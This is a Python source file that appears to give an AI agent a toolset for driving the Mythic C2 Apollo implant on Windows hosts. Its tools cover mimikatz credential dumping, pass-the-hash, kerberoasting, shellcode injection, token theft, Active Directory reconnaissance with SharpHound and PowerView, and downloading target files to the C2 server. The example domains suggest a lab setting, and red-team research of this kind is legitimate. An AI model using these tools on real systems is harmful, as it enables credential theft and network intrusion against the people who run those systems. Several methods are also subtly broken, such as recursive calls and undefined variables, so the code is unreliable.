import tempfile
import typing as t
from dataclasses import dataclass
from pathlib import Path
from uuid import uuid4

import aiofiles
import rich
from loguru import logger
from rich.panel import Panel

from dreadnode.agent.tools import Toolset, tool_method
from mythic import mythic  # type: ignore

MAX_ACTOR_PAYLOAD_SIZE = 1 * 1024 * 1024


SCRIPTS_DIR = Path(__file__).resolve().parent / "scripts"


@dataclass
class Apollo(Toolset):
    _client = None
    _callback_id: int | None = None
    _intialized: bool = False

    name: str = "Apollo"
    description: str = "A Windows Post-Exploitation Tool"

    @classmethod
    async def create(
        cls,
        username: str,
        password: str,
        server_ip: str,
        server_port: int,
        timeout: int = -1,
        callback_id: int = 0,
    ) -> "Apollo":
        """Create an instance of the Apollo class."""

        instance = cls()

        try:
            client = await mythic.login(
                username=username,
                password=password,
                server_ip=server_ip,
                server_port=server_port,
                timeout=timeout,
            )

            instance._client = client
            instance._callback_id = callback_id
            instance._intialized = True
            await instance.create(
                username=username,
                password=password,
                server_ip=server_ip,
                server_port=server_port,
                timeout=timeout,
            )
        except Exception as e:
            err_msg = f"Failed to login to Mythic: {e}"
            logger.error(err_msg)
            raise RuntimeError(err_msg) from e
        else:
            return instance

    async def execute(
        self,
        command: str,
        args: dict[str, t.Any] | str,
        timeout: int | None = None,
    ) -> str:
        """
        Executes supplied command to the Apollo implant through the Mythic C2 framework
        """
        logger.debug(self._rich_print(f"Executing command: {command} with args: {args}"))

        try:
            output_bytes = await mythic.issue_task_and_waitfor_task_output(
                mythic=self._client,
                command_name=command,
                parameters=args,
                callback_display_id=self._callback_id,
                timeout=timeout,
            )
        except (TimeoutError, ValueError) as e:
            output = f"An unexpected error occured when trying to execute previous command. The error is:\n\n{e}.\n. Sometimes the command just needs to be re-executed, however if already tried to re-execute the command, best to move on to another."
            logger.warning(self._rich_print(output))
            return output

        if not output_bytes:
            output = f"Command '{command}' returned no output."
            logger.debug(self._rich_print(output))
            return output

        logger.debug(self._rich_print(f"Command output: {output}"))

        return str(output_bytes.decode() if isinstance(output_bytes, bytes) else output_bytes)

    @tool_method(name="cat", description="Read the contents of a file at the specified path.")
    async def cat(
        self,
        path: t.Annotated[str, "The path of the file to read."],
    ) -> str:
        if not path:
            path = ""

        return await self.execute(
            command="cat",
            args=path,
        )

    @tool_method
    async def cd(self, path: t.Annotated[str, "The path to change into."]) -> str:
        """
        Change directory to [path]. Path relative identifiers such as ../ are accepted. The path can be absolute or relative. If the path is relative, it will be resolved against the current working directory of the agent.

        Examples:
            cd -path C:\\\\Users\\Public\\Documents
            cd ..
        """

        return await self.execute(
            command="cd",
            args=path,
        )

    @tool_method
    async def cp(
        self,
        source: t.Annotated[str, "The path to the source file on the target system to copy."],
        dest: t.Annotated[
            str | None,
            "The destination path on the target system to copy the file to.",
        ],
    ) -> str:
        """
        Copy a file from the source path to the destination path on the target system. The source and destination paths can be absolute or relative. If the paths are relative, they will be resolved against the current working directory of the agent.

        Examples:
            cp c:\\\\path\\to\\source.txt C:\\\\path\\to\\destination.txt
            cp -path C:\\\\path\\to\\source.txt" -dest" C:\\\\path\\to\\destination.txt
        """

        return await self.execute(
            command="cp",
            args=[
                "-source",
                source,
                "-dest",
                dest,
            ],
        )

    @tool_method
    async def download(
        self,
        path: t.Annotated[str, "The full path of the file on the target system to download."],
    ) -> str:
        """
        Download a file from the target system to the C2 server. The file will be saved with the specified filename on the C2 server.

        Examples:
            download -path "C:\\\\Windows\\\\passwords.txt"
        """

        return await self.execute(
            command="download",
            args=path,
        )

    @tool_method
    async def getprivs(self) -> str:
        """
        Attempt to enable all possible privileges for the agent's current access token. This may include privileges like SeDebugPrivilege, SeImpersonatePrivilege, etc.
        """
        return await self.execute(
            command="getprivs",
            args="",
        )

    @tool_method
    async def ifconfig(self) -> str:
        """
        List the network interfaces and their configuration details on the target system. This includes IP addresses, subnet masks, and other relevant information.
        """
        return await self.execute(
            command="ifconfig",
            args="",
        )

    @tool_method
    async def jobkill(
        self,
        jid: t.Annotated[int, "The job identifier of the background job to terminate."],
    ) -> str:
        """
        Terminate a background job with the specified job identifier (jid). This will stop the job from running and free up any resources it was using.

        Examples:
            jobkill 12345
            jobkill -jid 67890
            jobkill {"jid": 12345}
        """
        return await self.execute(
            command="jobkill",
            args=jid,
        )

    @tool_method
    async def jobs(self) -> str:
        """
        Get all currently active background jobs being managed by the agent.

        Prompt:
            List all currently active background jobs being managed by the agent. This includes jobs that are running, completed, or failed.

        Examples:
            jobs
            jobs -all
            jobs {"all": true}
        """

        return await self.execute(
            command="jobs",
            args="",
        )

    @tool_method
    async def ls(
        self,
        path: t.Annotated[
            str | None,
            "The path of the directory to list. Defaults to the current working directory.",
        ],
    ) -> str:
        """
        List files and folders in a specified directory.
        If no path is specified, the current working directory will be used. The path can be absolute or relative. If the path is relative, it will be resolved against the current working directory of the implant.
        """
        path = "" if not path or "null" in path.lower() else {"Path": path}

        return await self.execute(
            command="ls",
            args=path,
        )

    @tool_method
    async def make_token(
        self,
        username: t.Annotated[str, "The username to use for the new logon session."],
        password: t.Annotated[str, "The password for the specified username."],
        netonly: t.Annotated[
            str | None,
            "If true, the token will be created for network access only. If false, the token will be created for interactive access.",
        ],
    ) -> str:
        """
        Create a new logon session using the specified [username] and [password]. The token can be created for network access only or interactive access based on the [netonly] parameter.

        Examples:
            make_token -username user -password password -netonly false
            make_token {"username": "user", "password": "password", "netonly": false}
            make_token {"username": "domain\\sam_accountname","password": "users_password","netOnly": true}
        """
        return await self.execute(
            command="make_token",
            args={"username": username, "password": password, "netOnly": str(netonly)},
        )

    @tool_method
    async def mimikatz(
        self,
        commands: t.Annotated[
            list[str],
            "A list of Mimikatz commands to execute. Each command should be separated by a newline.",
        ],
    ) -> str:
        """
        Execute one or more mimikatz commands using its reflective library.

        Examples:
            mimikatz sekurlsa::logonpasswords
            mimikatz sekurlsa::tickets
            mimikatz token::list
            mimikatz lsadump::sam
            mimikatz sekurlsa::wdigest
            mimikatz vault::cred
            mimikatz vault::list
            mimikatz sekurlsa::dpapi
        """

        return await self.execute(
            command="mimikatz",
            args=commands,
        )

    @tool_method(
        name="net_dclist",
        description="Enumerate Domain Controllers for the specified domain (or the current domain).",
    )
    async def net_dclist(
        self,
        domain: t.Annotated[
            str | None,
            "The target domain for which to enumerate Domain Controllers. Defaults to the current domain if omitted.",
        ],
    ) -> str:
        domain = "" if not domain or "null" in domain.lower() else {"Domain": domain}

        return await self.execute(
            command="net_dclist",
            args=domain,
        )

    @tool_method
    async def net_localgroup(
        self,
        computer: t.Annotated[
            str | None, "Defaults to the local machine (localhost) if omitted."
        ] = None,
    ) -> str:
        """
        List the local groups on the specified [computer]. If no computer is specified, the local machine will be used.

        Examples:
            net_localgroup -computer "east.dreadnode.local"
            net_localgroup -computer "east.dreadnode.local"
        """

        return await self.execute(
            command="net_localgroup",
            args=computer or "",
        )

    @tool_method
    async def net_localgroup_member(
        self,
        group: t.Annotated[str, "The name of the local group to list members for."],
        computer: t.Annotated[
            str | None,
            "The hostname or IP address of the target computer. Defaults to the local machine (localhost) if omitted.",
        ] = None,
    ) -> str:
        """
        List the members of a specific local [group] on the specified [computer]. If no computer is specified, the local machine will be used.

        Examples:
            net_localgroup_member -computer "east.dreadnode.local" -group "Administrators"
            net_localgroup_member -computer "domain1.north.dreadnode.local" -group "Users"
        """

        return await self.execute(
            command="net_localgroup_member",
            args=f"-group {group} -computer {computer} " if computer else f"-group {group}",
        )

    @tool_method
    async def net_shares(
        self,
        computer: t.Annotated[
            str,
            "The hostname or IP address of the target computer. Defaults to the local machine (localhost) if omitted.",
        ],
    ) -> str:
        """
        List network shares available on the specified [computer]. If no computer is specified, the local machine will be used.

        Examples:
            net_shares -computer "north.sevenkingdoms.local"
            net_shares -computer "winterfell.north.sevenkingdoms.local"
        """

        return await self.execute(
            command="net_shares",
            args=computer,
        )

    @tool_method
    async def netstat(self) -> str:
        """Display active TCP/UDP connections and listening ports on the target system. This includes information about the local and remote addresses, port numbers, and connection states."""
        return await self.execute(command="netstat", args="")

    @tool_method
    async def powerpick(
        self,
        arguments: t.Annotated[
            str,
            "The PowerShell command or script block to execute. This can be a single command or a script block enclosed in curly braces.",
        ],
    ) -> str:
        """
        Injects a PowerShell loader into a sacrificial process and executes the provided PowerShell [command]. This allows for executing PowerShell commands or scripts in the context of the agent's current security token.

        powerpick -arguments "Get-Process"
        """
        return await self.execute(command="powerpick", args=arguments)

    @tool_method
    async def powershell_import(
        self,
        filename: t.Annotated[
            str,
            ".ps1 file to be registered within Apollo agent and made available to PowerShell jobs",
        ],
    ) -> str:
        """
        Register a new powershell .ps1 file in the Apollo agent and allow for powershell script to be available for PowerShell jobs.
        This is not Powershell's Import-Module command but Apollo's native powershell import command. The file must exist on the Mythic C2 server. If file is not present, it can be uploaded with the upload tool.
        """
        return await self.execute(
            command="powershell_import", args={"existingFile": filename}, timeout=60
        )

    @tool_method
    async def powershell_script(
        self,
        filename: t.Annotated[str, "File name of powershell script."],
        script: t.Annotated[str, "Powershell script. Encoded as a raw string."],
        entry_function: t.Annotated[
            str,
            "Name of the Powershell entry function to call to start execution of the script.",
        ],
    ) -> str:
        """
        Executes the supplied powershell script on a target host. Supply the powershell script as a string. The powershell script must be composed of powershell functions where one of these functions will be the entry function that will be called to start the script.
        """
        if not filename.endswith(".ps1"):
            filename = f"{filename}.ps1"

        # NOTE: cant use Python tempfile here as need specific filename
        local_tmp_file = await self._write_tmp_file(filename=filename, text=script)

        # 2. upload powershell script file to Mythic server
        upload_result = await self._client.upload_file_to_mythic_server(
            filename=local_tmp_file, reupload=True
        )
        await self._delete_local_file(local_tmp_file)
        if upload_result["file_id"] is None:
            return "Error running 'powershell_script' commmand.\n\n Attempting to upload powershell script file to Mythic led to unknown error."

        pi_result = await self.powershell_import(filename)

        if "will now be imported in PowerShell commands" not in pi_result:
            return "Error running 'powershell_import' Mythic command."

        return await self.powerpick(command=entry_function)

    @tool_method
    async def powerview(
        self,
        command: t.Annotated[
            str,
            "Powerview command line arguments to supply to the powershell instance and execute.",
        ],
        credential_user: t.Annotated[
            str | None, "username to execute Powerview commands as specified user"
        ] = None,
        credential_password: t.Annotated[
            str | None, "password to execute Powerview commands as specified user"
        ] = None,
        domain: t.Annotated[
            str | None, "domain to execute Powerview commands as specified user"
        ] = None,
    ) -> str:
        """
        Imports PowerView into Powershell (for use) and then executes the supplied command line arguments in current Powershell instance.

        """

        powerview_script_filename = "PowerView.ps1"
        upload_result = await self._client.upload_file_to_mythic_server(
            filename=SCRIPTS_DIR / powerview_script_filename,
            reupload=False,
        )
        if upload_result["file_id"] is None:
            return f"Error running 'powerview' command.\n\n Attempting to upload {powerview_script_filename} file to Mythic led to unknown error."
        logger.info(self._rich_print(f"Uploaded {powerview_script_filename} to Mythic."))

        pi_result = await self.powershell_import(filename=upload_result["filename"])
        if "will now be imported in PowerShell commands" not in pi_result:
            return f"Error running [COMMAND] 'powershell_import': - {pi_result}."

        if all([credential_user, credential_password, domain]):
            powerview_cmd = f"{command} -Credential (New-Object -TypeName 'System.Management.Automation.PSCredential' -ArgumentList '{domain}\\{credential_user}', (ConvertTo-SecureString -String '{credential_password}' -AsPlainText -Force))"

        return await self.powerpick(command=powerview_cmd)

    @tool_method
    async def pth(
        self,
        domain: t.Annotated[
            str, "The target domain for which to perform the Pass-the-Hash operation."
        ],
        username: t.Annotated[str, "The username to authenticate as."],
        password_hash: t.Annotated[
            str,
            "The NTLM hash of the user's password. This is used instead of the plaintext password.",
        ],
    ) -> str:
        """
        Authenticate to a remote system using a Pass-the-Hash technique with the specified [domain], [username], and [password_hash]. This allows for authentication without needing the plaintext password.

        Examples:
            pth -domain "north.sevenkingdoms.local" -username "jeor.mormont" -password_hash "5f4dcc3b5aa765d61d8327deb882cf99"
        """
        return await self.execute(
            command="pth",
            args=[
                "-domain",
                domain,
                "-username",
                username,
                "-password_hash",
                password_hash,
            ],
        )

    @tool_method
    async def ps(
        self,
        args: t.Annotated[str, "arguments for the 'ps' command, encoded in a string"],
    ) -> str:
        """List running processes on the target system, typically including PID, name, architecture, and user context."""
        return await self.execute(
            command="ps",
            args=args,
        )

    @tool_method
    async def pwd(self) -> str:
        """Print the agent's current working directory on the target system. This is the directory where the agent is currently operating."""
        return await self.execute(
            command="pwd",
            args="",
        )

    @tool_method
    async def reg_query(
        self,
        key: t.Annotated[
            str,
            "The full path of the registry key to query (e.g., 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion').",
        ],
    ) -> str:
        """Query the values and subkeys under a specified registry [key]. This allows for retrieving information from the Windows registry.

        Examples:
            reg_query -key "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion"
        """
        return await self.execute(
            command="reg_query",
            args=key,
        )

    @tool_method
    async def register_assembly(
        self,
        filename: t.Annotated[str, "Assembly file to register to the Apollo agent"],
    ) -> str:
        """
        Registers (loads) assembly files/commands to a Mythic agent.
        """
        return await self.execute(
            command="register_assembly",
            args={"existingFile": filename},
            fix_dependencies=False,
        )

    @tool_method
    async def rev2self(self) -> str:
        """
        Revert the agent's impersonation state, returning to its original primary token. This is useful for restoring the agent's original security context after performing actions with a different token.

        This command is useful when the agent has been impersonating another user or process and needs to revert back to its original state.
        """
        return await self.execute(
            command="rev2self",
            args="",
        )

    @tool_method
    async def rubeus_asreproast(self) -> str:
        """
        Execute ASREP-Roast technique against current domain using the Rubeus tool. The technique extracts kerberos ticket-granting tickets for active directory users that dont require pre-authentication on the domain. If ticket-granting tickets can be obtained, they will be returned (in hash form)
        ."""
        return await self.execute(
            command="execute_assembly", args="Rubeus.exe asreproast /format:hashcat"
        )

    @tool_method
    async def rubeus_kerberoast(
        self,
        cred_user: t.Annotated[
            str,
            "principal domain user to execute the command under, formatted in fqdn format: 'domain\\user'",
        ],
        cred_password: t.Annotated[str, "principal domain user password"],
        user: t.Annotated[str | None, "specific domain user to target for kerberoasting"] = None,
        spn: t.Annotated[str | None, "specific SPN to target for kerberoasting"] = None,
    ) -> str:
        """
        Kerberoast a user current domain using the Rubeus tool. The tool extracts kerberos ticket-granting tickets for active directory users that have service principal names (SPNs) set. To use 'rubeus_kerberoast' tool, you must have a username and password of existing user on the active directory domain. If ticket-granting tickets for the SPN accounts can be obtained, they will be returned (in a hash format).
        """
        args = f"Rubeus.exe kerberoast /creduser:{cred_user} /credpassword:{cred_password} /format:hashcat"

        if user is not None:
            args += f" /user:{user}"

        if spn is not None:
            args += f" /spn:{spn}"

        return await self.execute(command="execute_assembly", args=args)

    @tool_method
    async def seatbelt(self) -> str:
        """Performs a number of security oriented host-survey 'safety checks' relevant from both offensive and defensive security perspectives."""
        return await self.execute(command="execute_assembly", args="Seatbelt.exe")

    @tool_method
    async def set_injection_technique(
        self,
        technique: t.Annotated[
            str,
            "The name of the process injection technique to use for subsequent injection commands (e.g., 'CreateRemoteThread', 'MapViewOfSection'). Must be a technique supported by the agent (see `get_injection_techniques`).",
        ],
    ) -> str:
        """
        Set the default process injection technique used by commands like `assembly_inject`, `execute_assembly`, etc. This allows for specifying the method of injecting code into a target process.

        Examples:
            set_injection_technique -technique "CreateRemoteThread"
        """
        return await self.execute(
            command="set_injection_technique",
            args=technique,
        )

    @tool_method
    async def setspn(self, args: t.Annotated[str, "Command line arguments for setspn tool"]) -> str:
        """
        Allows for reading, modifying, and detelting the Service Principal Names (SPN) directory property for an Active Directory (AD) account. You can use setspn to view the current SPNs for an account, reset the account's default SPNs, and add or delete supplemental SPNs.

        Reference:  https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn
        """
        return await self.powerpick(arguments=f"($sspn = setspn {args}); echo $sspn")

    @tool_method
    async def sharphound_and_download(
        self,
        domain: t.Annotated[str, "domain to enumerate."],
        ldap_username: t.Annotated[str | None, "LDAP username to use for Sharphound."] = None,
        ldap_password: t.Annotated[str | None, "LDAP username to use for Sharphound."] = None,
        local_filename: t.Annotated[str | None, "Filename"] = None,
    ) -> str | dict:
        """
        Run sharphound on the target callback to collect Bloodhound data. Then download the
        Bloodhound results file to a local file. "local" being wherever the agent is running.
        """

        upload_result = await self.upload(
            filename=SCRIPTS_DIR / "SharpHound.ps1",
            reupload=False,
        )
        if upload_result["file_id"] is None:
            return "Error running command 'sharphound_and_download'.\n\n Attempting to upload powershell script file to Mythic led to unknown error."
        logger.info(self._rich_print("Uploaded SharpHound to Mythic."))

        pi_result = await self.powershell_import(filename=upload_result["filename"])
        if "will now be imported in PowerShell commands" not in pi_result:
            return f"Error running 'sharphound_and_download': {pi_result}"

        zip_filename_marker = f"{uuid4()!s}.zip"
        sharp_cmd = f"Invoke-BloodHound -Zipfilename {zip_filename_marker} -Domain {domain}"
        if all([ldap_username, ldap_username]):
            sharp_cmd += f" --ldapusername {ldap_username} --ldappassword {ldap_password}"

        sharphound_result = await self.powerpick(command=sharp_cmd, timeout=120)

        if "SharpHound Enumeration Completed" not in sharphound_result:
            return f"Error running 'sharphound_and_download'.\n\n Command response:\n{sharphound_result}"

        sharp_results_fn = await self.powerpick(
            command=f"(Get-ChildItem -Path .\\ -Filter '*{zip_filename_marker}').name",
            fix_dependencies=True,
        )

        if zip_filename_marker not in sharp_results_fn:
            return f"Error running 'sharphound_and_download'.\n\n Command response:\n{sharp_results_fn}"

        sharp_results_fn = sharp_results_fn.strip("\r\n").split("\r\n")[-1]

        local_download_file = await self.download(filepath=sharp_results_fn)

        if not isinstance(local_download_file, dict):
            return f"Error running 'sharphound_and_download'.\n\n Command response:\n{local_download_file}"
        logger.info(self._rich_print(f"Downloaded file to:{local_download_file['path']}"))

        # 6. rename local file if supplied Command specified a specific filename to use
        if local_filename:
            Path.rename(local_download_file.path, local_filename)
            logger.info(
                self._rich_print(
                    f"Renamed filename from {local_download_file.path} to {local_filename}"
                )
            )
            local_download_file["path"] = str(Path(local_filename).resolve())
            local_download_file["name"] = Path(local_download_file["path"]).name

        return local_download_file

    @tool_method
    async def sharpview(
        self,
        method: t.Annotated[str, "SharpView method to execute"],
        method_args: t.Annotated[str, "arguments for the selected SharpView method"],
    ) -> str:
        """
        Used to gain network situational awareness on Windows domains.

        Available methods to use for the tool:

        Get-DomainGPOUserLocalGroupMapping
        Find-GPOLocation
        Get-DomainGPOComputerLocalGroupMapping
        Find-GPOComputerAdmin
        Get-DomainObjectAcl
        Get-ObjectAcl
        Add-DomainObjectAcl
        Add-ObjectAcl
        Remove-DomainObjectAcl
        Get-RegLoggedOn
        Get-LoggedOnLocal
        Get-NetRDPSession
        Test-AdminAccess
        Invoke-CheckLocalAdminAccess
        Get-WMIProcess
        Get-NetProcess
        Get-WMIRegProxy
        Get-Proxy
        Get-WMIRegLastLoggedOn
        Get-LastLoggedOn
        Get-WMIRegCachedRDPConnection
        Get-CachedRDPConnection
        Get-WMIRegMountedDrive
        Get-RegistryMountedDrive
        Find-InterestingDomainAcl
        Invoke-ACLScanner
        Get-NetShare
        Get-NetLoggedon
        Get-NetLocalGroup
        Get-NetLocalGroupMember
        Get-NetSession
        Get-PathAcl
        ConvertFrom-UACValue
        Get-PrincipalContext
        New-DomainGroup
        New-DomainUser
        Add-DomainGroupMember
        Set-DomainUserPassword
        Invoke-Kerberoast
        Export-PowerViewCSV
        Find-LocalAdminAccess
        Find-DomainLocalGroupMember
        Find-DomainShare
        Find-DomainUserEvent
        Find-DomainProcess
        Find-DomainUserLocation
        Find-InterestingFile
        Find-InterestingDomainShareFile
        Find-DomainObjectPropertyOutlier
        TestMethod
        Get-Domain
        Get-NetDomain
        Get-DomainComputer
        Get-NetComputer
        Get-DomainController
        Get-NetDomainController
        Get-DomainFileServer
        Get-NetFileServer
        Convert-ADName
        Get-DomainObject
        Get-ADObject
        Get-DomainUser
        Get-NetUser
        Get-DomainGroup
        Get-NetGroup
        Get-DomainDFSShare
        Get-DFSshare
        Get-DomainDNSRecord
        Get-DNSRecord
        Get-DomainDNSZone
        Get-DNSZone
        Get-DomainForeignGroupMember
        Find-ForeignGroup
        Get-DomainForeignUser
        Find-ForeignUser
        ConvertFrom-SID
        Convert-SidToName
        Get-DomainGroupMember
        Get-NetGroupMember
        Get-DomainManagedSecurityGroup
        Find-ManagedSecurityGroups
        Get-DomainOU
        Get-NetOU
        Get-DomainSID
        Get-Forest
        Get-NetForest
        Get-ForestTrust
        Get-NetForestTrust
        Get-DomainTrust
        Get-NetDomainTrust
        Get-ForestDomain
        Get-NetForestDomain
        Get-DomainSite
        Get-NetSite
        Get-DomainSubnet
        Get-NetSubnet
        Get-DomainTrustMapping
        Invoke-MapDomainTrust
        Get-ForestGlobalCatalog
        Get-NetForestCatalog
        Get-DomainUserEvent
        Get-UserEvent
        Get-DomainGUIDMap
        Get-GUIDMap
        Resolve-IPAddress
        Get-IPAddress
        ConvertTo-SID
        Invoke-UserImpersonation
        Invoke-RevertToSelf
        Get-DomainSPNTicket
        Request-SPNTicket
        Get-NetComputerSiteName
        Get-SiteName
        Get-DomainGPO
        Get-NetGPO
        Set-DomainObject
        Set-ADObject
        Add-RemoteConnection
        Remove-RemoteConnection
        Get-IniContent
        Get-GptTmpl
        Get-GroupsXML
        Get-DomainPolicyData
        Get-DomainPolicy
        Get-DomainGPOLocalGroup
        Get-NetGPOGroup
        """
        return await self.powerpick(f"Invoke-SharpView -Method {method} -Arguments {method_args}")

    @tool_method
    async def shinject(self) -> str:
        """
        Inject raw shellcode into a remote process. This allows for executing arbitrary code in the context of another process.

        Examples:
            shinject -path "C:\\\\Windows\\\\System32\\\\notepad.exe" -shellcode "0x90, 0x90, 0x90"
        """
        return await self.execute(
            command="shinject",
            args="",
        )

    @tool_method
    async def spawn(self) -> str:
        """Spawn a new agent session using the currently configured 'spawnto' executable and payload template (must be shellcode)."""

        return await self.execute(
            command="spawn",
            args="",
        )

    @tool_method
    async def spawnto_x64(
        self,
        path: t.Annotated[
            str,
            "The full path to the 64-bit executable that the agent should launch for subsequent post-exploitation jobs or spawning new sessions.",
        ],
        args: t.Annotated[
            str | None,
            "A list of command-line arguments to launch the [path] executable with.",
        ],
    ) -> str:
        """
        Configure the default 64-bit executable [path] (and optional [args]) used for process injection targets and spawning. This allows for specifying the executable that will be used for subsequent post-exploitation jobs or spawning new sessions.

        Examples:
            spawnto_x64 -path "C:\\\\Windows\\\\System32\\\\notepad.exe" -args "-arg1 -arg2"
        """
        return await self.execute(
            command="spawnto_x64",
            args=[path, args] if args else [path],
        )

    @tool_method
    async def steal_token(
        self,
        pid: t.Annotated[
            int,
            "The process ID (PID) from which to steal the primary access token. If omitted, a default process (like winlogon.exe) might be targeted.",
        ],
    ) -> str:
        """
        Impersonate the primary access token of another process specified by its [pid]. This allows for executing commands with the security context of the target process.

        Examples:
            steal_token -pid 1234
        """
        return await self.execute(
            command="steal_token",
            args=pid,
        )

    @tool_method
    async def unlink(self) -> str:
        """
        Disconnect a specific callback communication channel (e.g., an SMB or TCP P2P link). This allows for terminating the connection to a specific channel without affecting other channels.

        Examples:
            unlink -channel "smb"
        """
        return await self.execute(
            command="unlink",
            args="",
        )

    @tool_method
    async def upload(
        self,
        path: t.Annotated[str, "Local path of the file to upload"],
        destination: t.Annotated[str, "Destination path on the remote host"],
    ) -> str:
        """
        Upload a file from the C2 server/operator machine to the target system. The file will be saved with the specified filename on the target system.

        Examples:
            upload -path "C:\\Windows\\passwords.txt" -dest "C:\\Users\\Administrator\\passwords.txt"
            upload {"Path": "C:\\Windows\\passwords.txt", "Destination": "C:\\Users\\Administrator\\passwords.txt"}
        """

        return await self.execute(
            command="upload",
            args={"Path": path, "Destination": destination},
        )

    @tool_method
    async def whoami(self) -> str:
        """Display the username associated with the agent's current security context (impersonated token or primary token). This includes information about the user and their privileges."""
        return await self.execute(
            command="whoami",
            args="",
        )

    @tool_method
    async def wmiexecute(
        self,
        arguments: t.Annotated[str, "The command or script block to execute on the remote system."],
    ):
        """Execute a command on a remote system using WMI (Windows Management Instrumentation). This allows for executing commands remotely without needing to establish a direct connection.

        Examples:
            wmiexecute -arguments "Get-Process"
        """
        return await self.execute(
            command="wmiexecute",
            args=arguments,
        )

    async def _write_tmp_file(
        self, filename: str, text: str | None = None, raw_bytes: bytes | None = None
    ) -> str:
        """creates a file, also in a temporary directory, and writes supplied contents.

        Returns: absolute filepath
        """
        if not any([raw_bytes, text]):
            raise TypeError("File contents, as bytes or text must be supplied.")

        tmp_dir = tempfile.TemporaryDirectory(delete=False)
        fullpath = Path(tmp_dir.name) / filename

        if raw_bytes:
            async with aiofiles.open(fullpath, mode="wb") as fh:
                await fh.write(raw_bytes)
        elif text:
            async with aiofiles.open(fullpath, mode="w") as fh:
                await fh.write(text)

        return str(fullpath)

    async def _delete_local_file(self, filename: str) -> None:
        """delete a local file"""
        try:
            fp = Path.resolve(filename)
            Path.unlink(fp)
        except (FileNotFoundError, OSError) as e:
            logger.warning(self._rich_print(f"Error trying to delete file {filename}: {e}"))

    async def _delete_local_file_and_dir(self, filename: str) -> None:
        """delete a local file and its parent directory"""
        try:
            fp = Path.resolve(filename)
            Path.unlink(fp)
            Path.rmdir(Path.parent(fp))
        except (FileNotFoundError, OSError) as e:
            logger.warning(
                self._rich_print(f"Error trying to delete file and directory {filename}: {e}")
            )

    def _rich_print(self, s: str) -> str:
        """utility for rich printing logs"""
        return rich.print(Panel(f"[white]{s}", title="[red1]Mythic", style="red1"))